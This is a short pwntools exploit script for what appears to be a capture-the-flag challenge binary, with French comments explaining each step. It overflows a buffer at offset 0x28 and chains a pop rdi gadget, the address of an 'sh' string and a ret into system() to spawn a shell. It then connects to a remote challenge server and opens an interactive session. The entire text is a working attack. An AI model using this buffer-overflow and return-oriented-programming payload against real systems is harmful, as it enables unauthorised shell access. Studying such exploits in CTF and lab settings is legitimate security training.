#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=2)
context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./bin")

if args.GDB:
    p = gdb.debug(
        "./bin",
        """
    source /home/user/.gdbinit-gef.py
    break *(main+100)
    continue
    """,
    )
elif args.LOCAL:
    p = process("./bin")
else:
    p = remote("cytech.tcdn.casa", 4601)

g_poprdi = 0x401263  # pop rdi; ret
g_ret = 0x401264  # ret
str_sh = 0x402049  # "sh" string

payload = flat(
    {
        # a l'offset 0x28 on a l'adresse de retour
        0x28: [
            # dont on va jump a l'addr d'un pop rdi (arg1), puis l'adresse de la chaine a pop
            g_poprdi,
            str_sh,
            # ensuite l'adresse d'un ret simple pour aligner la stack
            g_ret,
            # 'maintenant que nous avons bien 'sh' dans rdi, un appel a system()
            # fera un system("sh") !
            exe.plt.system,
        ]
    }
)

log.hexdump(payload)
p.sendlineafter(b"name: ", payload)
p.interactive()
